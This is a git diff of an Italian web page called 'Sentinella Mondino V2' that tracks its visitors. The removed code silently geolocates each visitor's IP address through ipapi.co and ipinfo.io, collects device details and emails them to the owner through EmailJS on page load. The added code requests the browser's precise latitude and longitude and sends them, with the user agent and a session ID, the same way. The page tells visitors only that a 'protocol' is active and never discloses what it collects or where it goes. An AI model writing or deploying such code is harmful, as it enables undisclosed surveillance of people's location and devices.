@@ -1,177 +1,49 @@
-<!DOCTYPE html>
-<html lang="it">
-<head>
-    <meta charset="UTF-8">
-    <title>Sentinella Mondino V2</title>
-    <style>
-        body {
-            background-color: #0a0a0a;
-            color: #ffffff;
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            text-align: center;
-        }
-        .msg {
-            font-size: 20px;
-            opacity: 0.7;
-        }
-    </style>
-</head>
-<body>
-
-<div class="msg">
-    Protocollo <b>Mondino Sentinella V2</b> attivo.<br>
-    Comunicazione in ascolto…
-</div>
-
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
 <script>
-// ==============================
-// 1️⃣ CONFIGURAZIONE SENTINELLA
-// ==============================
-const SERVICE_ID = "service_qf5owhx";
-const TEMPLATE_ID = "template_e1dwimp";
-const PUBLIC_KEY = "htX2_6oDOj4VqH1pD";
+emailjs.init("htX2_6oDOj4VqH1pD"); // PUBLIC KEY CORRETTA
 
-emailjs.init(PUBLIC_KEY);
-
-// ==============================
-// 2️⃣ FUNZIONE GEO → 1° TENTATIVO (ipapi)
-// ==============================
-async function geoPrimary() {
-    try {
-        const res = await fetch("https://ipapi.co/json/");
-        if (!res.ok) throw new Error("ipapi non risponde");
-        const d = await res.json();
-
-        return {
-            status: "OK",
-            ip: d.ip,
-            city: d.city,
-            region: d.region,
-            country: d.country_name,
-            provider: d.org,
-            source: "ipapi"
-        };
-    } catch (e) {
-        return { status: "FAIL" };
-    }
+// Genera ID univoco
+function generateSessionID() {
+    return "SESSION-" + Math.random().toString(36).substring(2, 10).toUpperCase();
 }
 
-// ==============================
-// 3️⃣ FUNZIONE GEO → 2° TENTATIVO (ipinfo)
-// ==============================
-async function geoFallback() {
-    try {
-        const res = await fetch("https://ipinfo.io/json?token=000000000000");
-        if (!res.ok) throw new Error("ipinfo non risponde");
-        const d = await res.json();
+const sessionID = generateSessionID();
 
-        return {
-            status: "OK",
-            ip: d.ip,
-            city: d.city,
-            region: d.region,
-            country: d.country,
-            provider: d.org,
-            loc: d.loc,
-            source: "ipinfo"
-        };
-    } catch (e) {
-        return { status: "FAIL" };
-    }
+// Recupero User Agent
+function deviceInfo() {
+    return navigator.userAgent;
 }
 
-// ==============================
-// 4️⃣ DATI DISPOSITIVO
-// ==============================
-function deviceData() {
-    return {
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        platform: navigator.platform,
-        resolution: `${window.screen.width}x${window.screen.height}`,
-        timestamp: new Date().toLocaleString()
+// Funzione principale
+function sendSignal(position) {
+    console.log("Invio segnale via EmailJS...");
+
+    const data = {
+        session_id: sessionID,
+        user_agent: deviceInfo(),
+        timestamp: new Date().toLocaleString(),
+        lat: position?.coords?.latitude || "NEGATA",
+        lon: position?.coords?.longitude || "NEGATA",
+        accuracy: position?.coords?.accuracy || "N/A"
     };
-}
 
-// ==============================
-// 5️⃣ COSTRUZIONE MESSAGGIO EMAIL
-// ==============================
-function buildEmail(geo, device) {
-    if (geo.status === "OK") {
-        return `
-Sentinella Mondino – Segnale Terrestre 🌍
-
-Località: ${geo.city}, ${geo.region}, ${geo.country}
-IP: ${geo.ip}
-Provider: ${geo.provider || "N/D"}
-Fonte GEO: ${geo.source}
-
-Dispositivo: ${device.userAgent}
-Lingua: ${device.language}
-Piattaforma: ${device.platform}
-Risoluzione: ${device.resolution}
-
-Ora locale: ${device.timestamp}
-`;
-    }
-
-    return `
-⚠️ SENTINELLA MONDINO – SEGNALAZIONE ANOMALIA ⚠️
-
-Origine: NON TERRESTRE / GEO NON DISPONIBILE
-IP: Nessun IP rilevato
-Provider: Non identificabile
-
-Dispositivo: ${device.userAgent}
-Lingua: ${device.language}
-Risoluzione: ${device.resolution}
-
-Ora sistema: ${device.timestamp}
-
-Possibile origine esterna alla rete terrestre.
-`;
-}
-
-// ==============================
-// 6️⃣ INVIO EMAIL
-// ==============================
-async function sendEmail(content) {
-    return emailjs.send(SERVICE_ID, TEMPLATE_ID, {
-        test: content
-    });
-}
-
-// ==============================
-// 7️⃣ PROCEDURA PRINCIPALE
-// ==============================
-async function sentinel() {
-    console.log("Sentinella Mondino V2 in ascolto…");
-
-    const device = deviceData();
-    let geo = await geoPrimary();
-
-    if (geo.status === "FAIL") {
-        console.warn("GEO primary failed → fallback");
-        geo = await geoFallback();
-    }
-
-    const emailContent = buildEmail(geo, device);
-
-    console.log("Invio segnale via EmailJS…");
-
-    sendEmail(emailContent)
+    emailjs.send("service_qf5owhx", "template_signal", data)
         .then(() => console.log("Segnale inviato!"))
-        .catch(e => console.error("Errore invio: ", e));
+        .catch(err => console.error("Errore invio:", err));
 }
 
-sentinel();
+// Richiesta geolocalizzazione
+if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+        pos => sendSignal(pos),
+        err => {
+            console.warn("Geolocalizzazione negata o non disponibile.");
+            sendSignal(null);
+        }
+    );
+} else {
+    console.warn("Geolocalizzazione non supportata.");
+    sendSignal(null);
+}
 </script>
-
-</body>
-</html>
